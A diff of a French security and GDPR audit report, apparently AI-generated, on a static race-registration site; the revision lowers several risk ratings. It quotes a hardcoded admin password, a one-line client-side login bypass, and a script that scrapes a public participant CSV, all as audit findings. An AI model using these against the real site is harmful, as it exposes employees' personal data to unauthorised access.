@@ -2,52 +2,58 @@
 
 > **Date** : 2026-04-11  
 > **Périmètre** : Revue complète du code source (7 113 lignes, 23 fichiers)  
-> **Réalisé par** : Claude Sonnet 4.6 (analyse statique automatisée)
+> **Réalisé par** : Claude Sonnet 4.6 (analyse statique automatisée)  
+> **Révision** : Niveaux de risque recalibrés après analyse du modèle de données réel
 
 ---
 
 ## Résumé exécutif
 
-L'application **SoRunning Inscriptions 2026** est un site statique (HTML/CSS/JS) hébergé sur GitHub Pages pour la gestion des inscriptions au Challenge Connecté 2026. L'analyse révèle des **vulnérabilités critiques** qui doivent être corrigées avant tout déploiement en production.
+L'application **SoRunning Inscriptions 2026** est un site statique (HTML/CSS/JS) hébergé sur GitHub Pages pour la gestion des inscriptions au Challenge Connecté 2026.
 
-| Domaine | Niveau de risque |
-|---------|-----------------|
-| Authentification | 🔴 CRITIQUE |
-| Protection des données personnelles | 🔴 CRITIQUE |
-| Conformité RGPD | 🔴 CRITIQUE |
-| Validation des entrées | 🟠 ÉLEVÉ |
-| Dépendances externes | 🟠 ÉLEVÉ |
-| Gestion des erreurs | 🟡 MOYEN |
-| Chiffrement | 🔴 CRITIQUE |
+### Modèle de données — point clé pour l'évaluation des risques
 
-**Score de conformité RGPD estimé : ~5 % (ÉCHEC CRITIQUE)**  
-**Niveau de risque global : ÉLEVÉ-CRITIQUE**
+L'application suit un modèle **"données éphémères côté client"** :
 
-> ⚠️ **RECOMMANDATION : NE PAS DÉPLOYER** en l'état auprès d'utilisateurs réels sans les corrections prioritaires décrites ci-dessous.
+- Les données PII (noms, emails, âge, région, société) **ne sont jamais persistées** — elles transitent uniquement en mémoire JavaScript pendant la durée d'une session admin, via un fichier Excel uploadé manuellement, que seul l'administrateur possède.
+- Ce qui est persisté dans `localStorage` se limite aux **assignations ID → N° dossard** et aux compteurs — sans aucune donnée nominative.
+- **Un attaquant qui bypasse l'interface admin sans avoir le fichier Excel ne peut accéder à aucune PII.**
+
+Ce constat change significativement les niveaux de risque par rapport à une première lecture du code.
+
+### Tableau de risque révisé
+
+| Domaine | Niveau de risque | Note |
+|---------|-----------------|------|
+| CSV public (verify.html) | 🔴 CRITIQUE | Seul vrai vecteur d'exposition de données |
+| Conformité RGPD | 🟠 ÉLEVÉ | Indépendant de la sécurité technique |
+| Authentification admin | 🟡 MOYEN | Risque limité sans fichier Excel |
+| Dépendances externes (SRI) | 🟡 MOYEN | Risque théorique supply chain |
+| localStorage | 🟢 FAIBLE | Aucune PII persistée |
+| Validation des entrées | 🟡 MOYEN | XSS mitigé par escapeHtml() |
+| Gestion des erreurs | 🟢 FAIBLE | Messages génériques suffisants |
+
+**Score de conformité RGPD estimé : ~20 %** (principalement des manques documentaires, non des failles techniques majeures)
 
 ---
 
 ## Table des matières
 
 1. [Structure du projet](#1-structure-du-projet)
-2. [Inventaire des données personnelles](#2-inventaire-des-données-personnelles)
-3. [Vulnérabilités critiques de sécurité](#3-vulnérabilités-critiques-de-sécurité)
-4. [Conformité RGPD article par article](#4-conformité-rgpd-article-par-article)
-5. [Points de collecte des données](#5-points-de-collecte-des-données)
-6. [Authentification et contrôle d'accès](#6-authentification-et-contrôle-daccès)
+2. [Modèle de données et flux](#2-modèle-de-données-et-flux)
+3. [Inventaire des données personnelles](#3-inventaire-des-données-personnelles)
+4. [Vulnérabilité principale — CSV public](#4-vulnérabilité-principale--csv-public)
+5. [Authentification — risque recalibré](#5-authentification--risque-recalibré)
+6. [localStorage — risque recalibré](#6-localstorage--risque-recalibré)
 7. [Services tiers et intégrations externes](#7-services-tiers-et-intégrations-externes)
-8. [Stockage des données](#8-stockage-des-données)
-9. [Cookies et traceurs](#9-cookies-et-traceurs)
-10. [Validation des entrées et sanitisation](#10-validation-des-entrées-et-sanitisation)
-11. [Gestion des erreurs et fuite d'informations](#11-gestion-des-erreurs-et-fuite-dinformations)
-12. [Dépendances et bibliothèques externes](#12-dépendances-et-bibliothèques-externes)
-13. [Secrets et identifiants codés en dur](#13-secrets-et-identifiants-codés-en-dur)
-14. [Rétention et suppression des données](#14-rétention-et-suppression-des-données)
-15. [Documents légaux et politique de confidentialité](#15-documents-légaux-et-politique-de-confidentialité)
-16. [Scénarios d'attaque](#16-scénarios-dattaque)
-17. [Cartographie OWASP Top 10](#17-cartographie-owasp-top-10)
-18. [Évaluation fichier par fichier](#18-évaluation-fichier-par-fichier)
-19. [Plan de remédiation priorisé](#19-plan-de-remédiation-priorisé)
+8. [Cookies et traceurs](#8-cookies-et-traceurs)
+9. [Validation des entrées et sanitisation](#9-validation-des-entrées-et-sanitisation)
+10. [Dépendances et bibliothèques externes](#10-dépendances-et-bibliothèques-externes)
+11. [Conformité RGPD article par article](#11-conformité-rgpd-article-par-article)
+12. [Documents légaux et politique de confidentialité](#12-documents-légaux-et-politique-de-confidentialité)
+13. [Scénarios d'attaque réalistes](#13-scénarios-dattaque-réalistes)
+14. [Évaluation fichier par fichier](#14-évaluation-fichier-par-fichier)
+15. [Plan de remédiation priorisé](#15-plan-de-remédiation-priorisé)
 
 ---
 
@@ -77,883 +83,479 @@ SoRunning-inscriptions-2026/
 
 ---
 
-## 2. Inventaire des données personnelles
+## 2. Modèle de données et flux
 
-### Catégories de données collectées
-
-| Catégorie | Champs | Base légale supposée | Rétention | Niveau de risque |
-|-----------|--------|---------------------|-----------|-----------------|
-| **Identité** | Nom, prénom | Consentement (non documenté) | Indéfinie | 🔴 ÉLEVÉ |
-| **Contact** | Email professionnel | Consentement (non documenté) | Indéfinie | 🔴 ÉLEVÉ |
-| **Identifiants** | ID participant, N° dossard | Nécessité contractuelle | Durée de l'événement | 🟡 MOYEN |
-| **Démographie** | Âge, sexe, région, société | Consentement (non documenté) | Indéfinie | 🟠 ÉLEVÉ |
-| **Inférence santé** | Catégorie de course (5/10/21 km) | Nécessité | Durée de l'événement | 🟠 ÉLEVÉ |
-| **Résultats** | Temps, classements, preuves | Consentement | Durée de l'événement | 🟡 MOYEN |
-| **Biométrique** | Photos (preuves de participation) | Consentement (non documenté) | Indéfinie | 🔴 CRITIQUE |
-
-**Volume estimé** : 795 à 900 participants (IDs séquentiels de 1 à 795+)
-
-> ⚠️ Les photos de preuve constituent des données **potentiellement biométriques** (visages reconnaissables), soumises à une protection renforcée (Article 9 RGPD).
-
-### Flux de données
+### Cycle de vie des données PII
 
 ```
-Participant
-    │
-    ├─► Microsoft Forms (inscription.html)
-    │       └─► Serveurs Microsoft (USA)
-    │               └─► Export Excel → Admin SNCF
-    │                       └─► localStorage navigateur (admin.html)
-    │                               └─► CSV anonymisé → GitHub Pages (PUBLIC)
-    │
-    └─► Tally.so (depot.html)
-            └─► Serveurs Tally (USA)
+Participant remplit Microsoft Forms
+        │
+        ▼
+Serveurs Microsoft (USA)
+        │
+        ▼ Export manuel (.xlsx) — seul l'admin possède ce fichier
+Admin uploade le fichier dans admin.html
+        │
+        ▼ Traitement en mémoire JS uniquement (session courante)
+Noms, emails, âge, région, société...
+        │                       │
+        │                       ▼ PII NON persistées
+        │               Disparaissent au refresh/fermeture
+        │
+        ▼ Seul ce qui est persisté dans localStorage :
+ID → N° dossard (pas de noms)
+Compteurs par catégorie (pas de noms)
+        │
+        ▼ Export par l'admin
+CSV anonymisé → GitHub Pages (PUBLIC) ← seul vecteur de risque réel
 ```
+
+### Ce qui n'est PAS stocké côté client
+
+| Donnée | localStorage | sessionStorage | Mémoire JS |
+|--------|:------------:|:--------------:|:----------:|
+| Noms, prénoms | ❌ | ❌ | ✅ (session) |
+| Emails | ❌ | ❌ | ✅ (session) |
+| Âge, sexe, région | ❌ | ❌ | ✅ (session) |
+| ID → N° dossard | ✅ | ❌ | ✅ |
+| Compteurs | ✅ | ❌ | ✅ |
+| Flag auth admin | ❌ | ✅ (session) | ❌ |
 
 ---
 
-## 3. Vulnérabilités critiques de sécurité
+## 3. Inventaire des données personnelles
 
-### 3.1 🔴 CRITIQUE — Mot de passe codé en dur dans le code source
+| Catégorie | Champs | Où stocké | Rétention | Risque |
+|-----------|--------|-----------|-----------|--------|
+| **Identité** | Nom, prénom | Mémoire JS (session) + Excel admin | Excel : chez l'admin | 🟡 MOYEN |
+| **Contact** | Email professionnel | Mémoire JS (session) + Microsoft Forms | Microsoft + Excel admin | 🟠 ÉLEVÉ |
+| **Identifiants** | ID participant, N° dossard | localStorage (ID→dossard sans nom) | Indéfinie | 🟢 FAIBLE |
+| **Démographie** | Âge, sexe, région, société | Mémoire JS (session) + Excel admin | Excel : chez l'admin | 🟡 MOYEN |
+| **Inférence santé** | Catégorie de course (5/10/21 km) | CSV anonymisé public | Indéfinie | 🟡 MOYEN |
+| **Résultats** | Temps, classements | Mémoire JS (session) | Session uniquement | 🟢 FAIBLE |
+| **Biométrique** | Photos (preuves) | Tally.so uniquement | Inconnue (Tally) | 🟠 ÉLEVÉ |
 
-**Fichiers concernés :**
-- [admin.html](admin.html) ligne 54
-- [resultats.html](resultats.html) ligne 291
+**Volume estimé** : 795 à 900 participants
 
-**Code vulnérable :**
-
-```javascript
-// admin.html:54 — VISIBLE DANS LE CODE SOURCE ET SUR GITHUB
-const MDP = 'cc2026admin';
-
-window.checkLogin = function() {
-  const val = document.getElementById('loginInput').value;
-  if (val === MDP) {
-    sessionStorage.setItem('admin_ok', '1');
-    document.getElementById('loginOverlay').style.display = 'none';
-  }
-};
-```
-
-**Problèmes identifiés :**
-- Mot de passe visible en clair dans le code source de la page (F12 → Sources)
-- Visible dans le dépôt GitHub (public ou accessible aux collaborateurs)
-- Même mot de passe pour `admin.html` et `resultats.html`
-- Contournement trivial via la console DevTools :
-  ```javascript
-  sessionStorage.setItem('admin_ok', '1'); // accès immédiat
-  ```
-- Aucune limitation du nombre de tentatives
-- Aucun verrouillage de compte
-- Aucun journal d'accès
-
-**Impact RGPD :** Accès non autorisé à des données personnelles (noms, emails, âges, régions, sociétés).
-
-**Remédiation :**
-- Court terme : Retirer le mot de passe du code source ; utiliser HTTP Basic Auth côté serveur ou une variable d'environnement
-- Long terme : Implémenter OAuth2 via SNCF SSO (Entra ID / Active Directory) avec MFA obligatoire
-- Ajouter un journal d'audit de chaque connexion réussie ou échouée
+> ℹ️ Le fichier Excel source avec les PII complètes reste sous la responsabilité directe de l'administrateur (stockage local, non exposé sur le web). Le risque principal porte sur le CSV anonymisé publié sur GitHub Pages.
 
 ---
 
-### 3.2 🔴 CRITIQUE — Exposition de données personnelles dans un CSV public
+## 4. Vulnérabilité principale — CSV public
 
-**Fichier concerné :** [data/participants_anonymises_Challenge_Connecté_2026.csv](data/participants_anonymises_Challenge_Connecté_2026.csv)  
-**Chargé par :** [verify.js](verify.js) ligne 8
+### 🔴 CRITIQUE — Accès public sans authentification au CSV participants
 
-**Structure du CSV :**
+**Fichier** : [data/participants_anonymises_Challenge_Connecté_2026.csv](data/participants_anonymises_Challenge_Connecté_2026.csv) (52 Ko)  
+**Chargé par** : [verify.js](verify.js) ligne 8, via `fetch()` sans aucun token
+
+**Structure exposée :**
 ```
 "ID";"NOM";"PRÉNOM";"EMAIL";"Course 5 km";"Course 10 km";...
 "188";"A*****";"L*****";"l***.a****@sncf.fr";"";"1126";"2048";...
 ```
 
-**Problèmes identifiés :**
+### Problème 1 — Anonymisation insuffisante
 
-| Problème | Détail |
-|---------|--------|
-| **Anonymisation insuffisante** | Première lettre + domaine email = réidentification triviale |
-| **Accès public sans authentification** | `fetch(CSV_PATH)` sans token ni authentification (verify.js:70) |
-| **Pas d'expiration** | Le fichier persiste indéfiniment sur GitHub |
-| **Historique Git** | Les versions précédentes du CSV sont accessibles via l'API GitHub |
-| **Dossards séquentiels** | Permettent de déduire le nombre total de participants |
-| **Domaine email visible** | `@sncf.fr`, `@reseau.sncf.fr` révèlent l'employeur exact |
+La troncature (première lettre + astérisques + domaine email) est réversible par croisement :
 
-**Scénario de réidentification :**
 ```
-Données CSV : "A*****" / "l***.a****@sncf.fr" / Région "IDF" / Âge ~35 / 5 km
-Croisement annuaire SNCF → Identification en quelques minutes
+Données CSV : "A*****" / "l***.a****@sncf.fr" / Région "IDF" / 5 km
+Croisement annuaire SNCF + réseaux sociaux → identification en quelques minutes
 ```
 
-**Articles RGPD violés :**
-- **Article 5(1)(e)** — Limitation de la conservation (durée indéfinie)
-- **Article 25** — Protection des données dès la conception (anonymisation non conforme CNIL)
-- **Article 32** — Mesures de sécurité insuffisantes
+Les données ne sont pas anonymisées au sens CNIL/RGPD — elles sont simplement **pseudonymisées de façon faible**, et ne bénéficient donc pas de l'exemption RGPD pour les données anonymes.
 
-**Remédiation :**
-- Mettre le fichier CSV derrière une authentification (pas accessible publiquement)
-- Remplacer la troncature par un hachage salé : `sha256(salt + email)` pour la recherche
-- Définir une durée de rétention (ex : suppression automatique 30 jours après l'événement)
-- Supprimer l'historique Git du fichier (`git filter-repo` ou BFG Repo Cleaner)
+### Problème 2 — Énumération triviale
+
+Les IDs sont séquentiels (1 → 795). Un script peut collecter l'intégralité des données en quelques secondes, sans aucune limite de débit :
+
+```python
+# Attaque triviale — aucun rate limiting côté serveur (site statique)
+import requests, csv
+resp = requests.get('https://.../data/participants_anonymises_....csv')
+# → 795 profils collectés en 1 requête
+```
+
+### Problème 3 — Historique Git
+
+Les versions précédentes du CSV (potentiellement moins anonymisées) sont accessibles via l'API GitHub, même après modification.
+
+### Articles RGPD concernés
+
+- **Article 25** — Protection des données dès la conception : anonymisation non conforme
+- **Article 5(1)(e)** — Limitation de la conservation : pas de date d'expiration
+- **Article 32** — Sécurité : accès public non contrôlé à des données pseudonymisées
+
+### Remédiation
+
+**Court terme (sans changer d'architecture) :**
+- Supprimer le fichier du dépôt public et purger l'historique Git (`git filter-repo`)
+- Remplacer la vérification publique par un système basé sur un token individuel envoyé par email à chaque participant (lien unique `verify.html?token=XYZ`)
+
+**Moyen terme :**
+- Passer la vérification derrière une API authentifiée (Netlify/Vercel Functions)
+- Utiliser un hachage salé côté serveur pour la recherche par ID
 
 ---
 
-### 3.3 🔴 CRITIQUE — Authentification uniquement côté client
+## 5. Authentification — risque recalibré
 
-**Fichiers concernés :** [admin.html](admin.html), [resultats.html](resultats.html)
+### 🟡 MOYEN — Mot de passe côté client (risque limité par le modèle de données)
 
-**Mécanisme actuel :**
+**Fichiers** : [admin.html](admin.html) ligne 54, [resultats.html](resultats.html) ligne 291
+
 ```javascript
-// sessionStorage utilisé comme seul mécanisme d'authentification
-sessionStorage.setItem('admin_ok', '1');  // Contournable en 2 secondes
+const MDP = 'cc2026admin';
+// Contournable via DevTools : sessionStorage.setItem('admin_ok', '1')
 ```
 
-**Contournement en une ligne :**
+### Pourquoi le risque est plus faible qu'il n'y paraît
+
+Un attaquant qui bypasse ce mot de passe **sans avoir le fichier Excel** ne peut accéder à aucune PII :
+
+| Ce qu'il peut faire | Impact réel |
+|--------------------|-------------|
+| Voir l'interface admin vide | Nul |
+| Lire localStorage (ID → dossard, sans noms) | Faible |
+| Générer de faux dossards avec un faux Excel | Très faible (fraude interne improbable) |
+| Voir les résultats (si uploadés) | Dépend du contenu uploadé |
+
+### Ce qui reste problématique
+
+- Le mot de passe est visible sur GitHub → **n'importe quel collaborateur du dépôt le connaît**
+- Pas de journal d'accès → impossible de savoir si quelqu'un a consulté les résultats
+- Pour `resultats.html` : si des résultats nominatifs sont uploadés, le risque remonte
+
+### Remédiation proportionnée
+
+Le risque ne justifie pas une refonte complète en OAuth2. Une mesure simple et suffisante :
+
 ```javascript
-// Dans la console DevTools du navigateur :
-sessionStorage.setItem('admin_ok', '1');
-// → Accès complet à l'interface admin sans mot de passe
+// Remplacer le mot de passe hardcodé par une variable d'environnement
+// via un build step (ex: Vite, Parcel) ou une Netlify Function
+// Ou simplement : mot de passe aléatoire long, communiqué hors-bande
+// et changé après chaque événement
+const MDP = process.env.ADMIN_PASSWORD; // si build step disponible
 ```
 
-**Absence de :**
-- Validation côté serveur
-- Authentification multifacteur (MFA)
-- Limitation du taux de tentatives (rate limiting)
-- Journalisation des accès
-- Expiration de session
-- Protection CSRF
-- Cloisonnement par rôle
-
-**Remédiation :**
-- Migrer vers un backend (Node.js, Python Flask, etc.) avec sessions serveur
-- Implémenter OAuth2 / OIDC via SNCF Entra ID
-- Ajouter MFA obligatoire pour l'accès admin
-- Mettre en place un contrôle d'accès basé sur les rôles (RBAC)
+À minima : **changer le mot de passe** pour un token aléatoire non devinable (`openssl rand -base64 24`) et ne pas le committer dans le dépôt.
 
 ---
 
-### 3.4 🔴 CRITIQUE — Stockage de données sensibles en clair dans localStorage
+## 6. localStorage — risque recalibré
 
-**Fichier concerné :** [script.js](script.js) lignes 219–241
+### 🟢 FAIBLE — Aucune PII persistée
 
-**Code vulnérable :**
+**Constat** : Les données nominatives (noms, emails, âge, région) ne sont **jamais écrites** dans `localStorage`. Elles existent uniquement en mémoire JS pendant la session admin, et disparaissent au refresh ou fermeture de l'onglet.
+
+**Ce qui est effectivement dans localStorage :**
 ```javascript
-function saveAssignments(a) {
-  localStorage.setItem(STORAGE_KEY, JSON.stringify(a));  // Clair, non chiffré
-}
-function loadAssignments() {
-  return JSON.parse(localStorage.getItem(STORAGE_KEY) || '{}');
-}
+// challenge2026_assignments
+{ "123": { number: "A0042", cat: "5km" }, "124": { number: "A0043", cat: "5km" }, ... }
+
+// challenge2026_counters
+{ "5km": 43, "10km": 31, "21km": 12 }
 ```
 
-**Données stockées en clair :**
-- Assignations ID → Numéro de dossard
-- Configurations et compteurs
-- Résultats de l'événement
-
-**Risques :**
-- Lisible par n'importe quelle extension de navigateur
-- Visible dans DevTools → Application → Local Storage
-- Persistant entre les sessions (pas d'expiration)
-- Non signé (intégrité non vérifiée)
-
-**Remédiation :**
-- Chiffrer les données avec TweetNaCl.js ou Web Crypto API avant stockage
-- Ou mieux : stocker côté serveur (base de données chiffrée)
-- Supprimer les données au déconnexion (ou après l'événement)
-
----
-
-## 4. Conformité RGPD article par article
-
-| Article | Intitulé | Statut | Problème constaté |
-|---------|---------|--------|------------------|
-| **Art. 5** | Principes relatifs au traitement | ❌ NON CONFORME | Confidentialité, limitation conservation, minimisation non respectées |
-| **Art. 6** | Licéité du traitement | ❌ NON CONFORME | Base légale non documentée ; consentement supposé mais non tracé |
-| **Art. 7** | Conditions du consentement | ❌ NON CONFORME | Aucune preuve de consentement recueillie |
-| **Art. 9** | Données sensibles | ⚠️ À VÉRIFIER | Photos de preuves potentiellement biométriques |
-| **Art. 12** | Transparence | ❌ NON CONFORME | Aucune politique de confidentialité dédiée |
-| **Art. 13/14** | Information des personnes | ❌ NON CONFORME | Durée de conservation, destinataires, droits non indiqués |
-| **Art. 15** | Droit d'accès | ⚠️ PARTIEL | Email de contact fourni, mais pas de procédure formelle |
-| **Art. 17** | Droit à l'effacement | ❌ NON CONFORME | Aucun mécanisme de suppression côté utilisateur |
-| **Art. 20** | Portabilité | ❌ NON CONFORME | Aucune fonctionnalité d'export pour les personnes |
-| **Art. 21** | Droit d'opposition | ❌ NON CONFORME | Pas de mécanisme d'opposition |
-| **Art. 25** | Protection dès la conception | ❌ NON CONFORME | Anonymisation insuffisante, pas de minimisation |
-| **Art. 28** | Sous-traitant | ❌ NON CONFORME | Pas de DPA visible avec Microsoft ni Tally |
-| **Art. 30** | Registre des traitements | ❌ NON CONFORME | Aucune documentation du traitement |
-| **Art. 32** | Sécurité du traitement | ❌ NON CONFORME | Mot de passe en dur, stockage non chiffré |
-| **Art. 33** | Notification de violation | ❌ NON CONFORME | Aucun plan de réponse aux incidents |
-| **Art. 34** | Communication aux personnes | ❌ NON CONFORME | Aucun mécanisme de notification |
-| **Art. 35** | AIPD (DPIA) | ❌ NON CONFORME | Non réalisée (obligatoire pour traitement à risque élevé) |
-| **Art. 37** | DPO | ❌ NON CONFORME | Délégué à la Protection des Données non mentionné |
-
-**Score global : ~5 % de conformité RGPD**
-
-> ⚠️ **Risque d'amende CNIL** : jusqu'à 20 M€ ou 4 % du chiffre d'affaires annuel mondial (Article 83 RGPD)
-
----
-
-## 5. Points de collecte des données
-
-### Point 1 — Microsoft Forms (`inscription.html`)
-
-- **URL** : `forms.office.com` (iframe embarqué)
-- **Données collectées** : Nom, prénom, email professionnel, sexe, âge, région, société, catégorie de course
-- **Traitement** : Exporté en `.xlsx`, importé dans `admin.html` via drag-and-drop
-- **Problèmes** :
-  - Données stockées initialement sur serveurs Microsoft (USA)
-  - Pas de DPA visible avec Microsoft
-  - Pas de mention explicite dans les CGU
-
-### Point 2 — Tally.so (`depot.html`)
-
-- **URL** : `tally.so/r/KYJJOM`
-- **Données collectées** : Preuves de participation (photos, captures), email, catégorie
-- **Traitement** : Stockées sur serveurs Tally (USA)
-- **Problèmes** :
-  - Entreprise américaine (transfert hors UE sans garanties documentées)
-  - Pas de DPA visible
-  - Photos = données potentiellement biométriques
-  - Durée de rétention inconnue
-
-### Point 3 — CSV de vérification (`verify.html`)
-
-- **Fichier** : `data/participants_anonymises_Challenge_Connecté_2026.csv`
-- **Données exposées** : ID, nom masqué, email masqué, numéros de dossard, participation par catégorie
-- **Problèmes** :
-  - Accès public sans authentification
-  - Énumération triviale des IDs (1 → 795)
-  - Anonymisation réversible
-
-### Point 4 — Upload Excel admin (`admin.html`)
-
-- **Mécanisme** : Drag-and-drop d'un fichier `.xlsx`
-- **Données traitées** : Tous les champs PII (noms complets, emails, données démographiques)
-- **Stockage** : `localStorage` en clair
-- **Problèmes** :
-  - Fichier complet avec PII chargé en mémoire navigateur
-  - Données visibles dans DevTools → Application
-  - Pas de suppression automatique après traitement
-
----
-
-## 6. Authentification et contrôle d'accès
-
-### Matrice d'accès actuelle
-
-| Ressource | Authentification | Type | Risque |
-|-----------|-----------------|------|--------|
-| `/index.html` | Aucune | Public | 🟢 FAIBLE |
-| `/inscription.html` | Aucune | Public (Microsoft Forms) | 🟡 MOYEN |
-| `/verify.html` | Aucune | Public (ID séquentiel) | 🔴 ÉLEVÉ |
-| `/data/*.csv` | Aucune | **Public** | 🔴 CRITIQUE |
-| `/admin.html` | Mot de passe client | Contournable | 🔴 CRITIQUE |
-| `/resultats.html` | Mot de passe client | Contournable | 🔴 CRITIQUE |
-| `/depot.html` | Aucune | Public (Tally) | 🟡 MOYEN |
-
-### Ce qui manque
-
-- [ ] Authentification côté serveur (pas de validation client-side)
-- [ ] Authentification multifacteur (MFA)
-- [ ] Gestion des sessions avec expiration
-- [ ] Journalisation des accès (qui, quand, depuis quelle IP)
-- [ ] Contrôle d'accès basé sur les rôles (RBAC)
-- [ ] Protection contre la force brute
-- [ ] Révocation de sessions
-- [ ] Protection CSRF
+Aucune de ces données ne permet d'identifier une personne directement. Le risque résiduel (mapping ID → dossard lisible par une extension) est négligeable dans ce contexte.
 
 ---
 
 ## 7. Services tiers et intégrations externes
 
-### Tableau des services tiers
+### Tableau des services
 
-| Service | Usage | Localisation données | DPA | SRI | Risque |
-|---------|-------|---------------------|-----|-----|--------|
-| **Microsoft Forms** | Formulaire d'inscription | USA (Microsoft Azure) | ❌ Non visible | ❌ Non | 🟠 ÉLEVÉ |
-| **Tally.so** | Dépôt de preuves | USA (Tally) | ❌ Non visible | ❌ Non | 🟠 ÉLEVÉ |
-| **Strava** | Lien communauté | USA | N/A (lien externe) | N/A | 🟡 MOYEN |
-| **Viva Engage** | Lien communauté SNCF | EU (Microsoft) | ❌ Non visible | N/A | 🟡 MOYEN |
-| **cdnjs.cloudflare.com** | SheetJS, html2canvas | USA (Cloudflare) | N/A | ❌ Non | 🟠 ÉLEVÉ |
-| **Google Fonts** | Typographie | USA (Google) | N/A | N/A | 🟡 MOYEN |
+| Service | Usage | Données transmises | DPA | SRI | Risque |
+|---------|-------|-------------------|-----|-----|--------|
+| **Microsoft Forms** | Formulaire d'inscription | Noms, emails, démographie | ❌ Non visible | ❌ Non | 🟠 ÉLEVÉ |
+| **Tally.so** | Dépôt de preuves | Photos, email, catégorie | ❌ Non visible | ❌ Non | 🟠 ÉLEVÉ |
+| **cdnjs.cloudflare.com** | SheetJS, html2canvas | Aucune (CDN statique) | N/A | ❌ Non | 🟡 MOYEN |
+| **Google Fonts** | Typographie | Aucune (navigateur) | N/A | N/A | 🟢 FAIBLE |
+| **Strava / Viva Engage** | Liens communauté | Aucune (liens externes) | N/A | N/A | 🟢 FAIBLE |
 
 ### Absence de Subresource Integrity (SRI)
 
-**Code actuel (admin.html:7-8) :**
+**admin.html:7-8 :**
 ```html
 <script src="https://cdnjs.cloudflare.com/ajax/libs/xlsx/0.18.5/xlsx.full.min.js"></script>
 <script src="https://cdnjs.cloudflare.com/ajax/libs/html2canvas/1.4.1/html2canvas.min.js"></script>
 ```
 
-**Risque :** Si le CDN est compromis, du code malveillant pourrait être injecté et exécuté lors de l'import de fichiers Excel (exfiltration des données PII).
+En l'absence de hash SRI, une compromission du CDN permettrait d'injecter du code exécuté lors du traitement des fichiers Excel. Risque théorique mais existant.
 
 **Remédiation :**
-```html
-<script 
-  src="https://cdnjs.cloudflare.com/ajax/libs/xlsx/0.18.5/xlsx.full.min.js"
-  integrity="sha384-[HASH_À_CALCULER]"
-  crossorigin="anonymous">
-</script>
+```bash
+curl -s https://cdnjs.cloudflare.com/ajax/libs/xlsx/0.18.5/xlsx.full.min.js \
+  | openssl dgst -sha384 -binary | openssl base64 -A
 ```
 
-Générer les hashes : `openssl dgst -sha384 -binary xlsx.full.min.js | openssl base64 -A`
+```html
+<script src="..." integrity="sha384-HASH" crossorigin="anonymous"></script>
+```
 
-### En-têtes de sécurité manquants
+### En-têtes HTTP de sécurité manquants
 
-GitHub Pages ne permet pas la configuration d'en-têtes HTTP personnalisés. Les en-têtes suivants sont absents :
+GitHub Pages ne permet pas de configurer des en-têtes personnalisés. Via Cloudflare (plan gratuit) :
 
 ```
 Content-Security-Policy: default-src 'self'; script-src 'self' cdnjs.cloudflare.com tally.so; frame-src forms.office.com tally.so
 X-Frame-Options: SAMEORIGIN
 X-Content-Type-Options: nosniff
-Strict-Transport-Security: max-age=31536000; includeSubDomains
 Referrer-Policy: strict-origin-when-cross-origin
-Permissions-Policy: camera=(), microphone=(), geolocation=()
 ```
-
-**Remédiation :** Utiliser Cloudflare (plan gratuit) devant GitHub Pages pour injecter ces en-têtes via des règles de transformation.
 
 ---
 
-## 8. Stockage des données
+## 8. Cookies et traceurs
 
-### Inventaire des emplacements de stockage
+| Type | Émetteur | Consentement demandé |
+|------|---------|---------------------|
+| Cookies Microsoft Forms | Microsoft | ❌ Non |
+| Cookies Tally.so | Tally | ❌ Non |
+| localStorage (thème, config) | Application | ❌ Non (mais non traceur) |
 
-#### GitHub Repository (Public)
-- **Fichier** : `data/participants_anonymises_Challenge_Connecté_2026.csv`
-- **Accès** : Public via URL directe **et** via l'API GitHub
-- **Problème** : L'historique Git conserve toutes les versions précédentes du fichier
+**Problème principal** : Aucune bannière de consentement. Les iframes Microsoft et Tally peuvent déposer des traceurs sans que l'utilisateur en soit informé.
 
-#### localStorage navigateur
-```javascript
-// Clés utilisées (script.js)
-'challenge2026_theme'       // Préférence dark/light
-'challenge2026_config'      // Configuration de l'événement
-'challenge2026_assignments' // Mapping ID → Dossard (PII)
-'challenge2026_counters'    // Compteurs dossards
-```
-- **Problème** : Données PII en clair, persistantes, lisibles par toute extension JS
-
-#### sessionStorage navigateur
-```javascript
-'admin_ok'      // Flag d'authentification admin
-'resultats_ok'  // Flag d'authentification résultats
-```
-- **Problème** : Contournable via DevTools
-
-#### Microsoft Forms (externe)
-- Réponses sur serveurs Microsoft
-- Pas sous contrôle SNCF direct
-
-#### Tally.so (externe)
-- Preuves de participation sur serveurs Tally
-- Pas sous contrôle SNCF direct
+**Remédiation** : Ajouter une bannière de consentement conforme CNIL avant l'affichage des iframes (chargement conditionnel après acceptation).
 
 ---
 
-## 9. Cookies et traceurs
+## 9. Validation des entrées et sanitisation
 
 ### État actuel
-
-| Type | Émetteur | Statut | Consentement demandé |
-|------|---------|--------|---------------------|
-| Cookies fonctionnels app | Aucun | N/A | N/A |
-| Cookies Microsoft Forms | Microsoft | Probable | ❌ Non |
-| Cookies Tally.so | Tally | Probable | ❌ Non |
-| Cookies GitHub Pages | GitHub/Fastly | Possible | ❌ Non |
-| localStorage | Application | Oui | ❌ Non |
-
-### Problèmes
-
-- ❌ Aucune bannière de consentement aux cookies
-- ❌ Aucune politique de cookies
-- ❌ localStorage utilisé comme alternative aux cookies sans divulgation
-- ❌ Services tiers susceptibles de déposer des traceurs sans information
-
-**Remédiation :**
-- Ajouter une bannière de consentement conforme CNIL (Axeptio, CookieBot, ou développement maison)
-- Créer une page "Gestion des cookies"
-- Documenter tous les traceurs dans la politique de confidentialité
-
----
-
-## 10. Validation des entrées et sanitisation
-
-### Couverture actuelle
 
 | Entrée | Validation | Sanitisation | Risque |
 |--------|-----------|--------------|--------|
-| Recherche ID (verify.js:127) | `trim()` + `toLowerCase()` | `escapeHtml()` | 🟡 MOYEN |
-| Upload Excel (script.js:345) | Extension `.xlsx/.xls` seulement | XLSX.read() | 🟠 ÉLEVÉ |
-| Mot de passe admin (admin.html:59) | Comparaison chaîne | Aucune | 🟠 ÉLEVÉ |
-| Formulaire Microsoft | Géré par Microsoft | N/A | 🟢 FAIBLE |
-| Formulaire Tally | Géré par Tally | N/A | 🟢 FAIBLE |
+| Recherche ID (verify.js:127) | `trim()` + `toLowerCase()` | `escapeHtml()` | 🟢 FAIBLE |
+| Upload Excel (script.js:345) | Extension `.xlsx/.xls` | `XLSX.read()` | 🟡 MOYEN |
+| Mot de passe (admin.html:59) | Comparaison chaîne | N/A | 🟡 MOYEN |
 
 ### XSS — Analyse
 
-**Implémentation de `escapeHtml()` (verify.js) :**
+`escapeHtml()` est correctement implémenté dans [verify.js](verify.js) :
+
 ```javascript
 function escapeHtml(str) {
   return String(str)
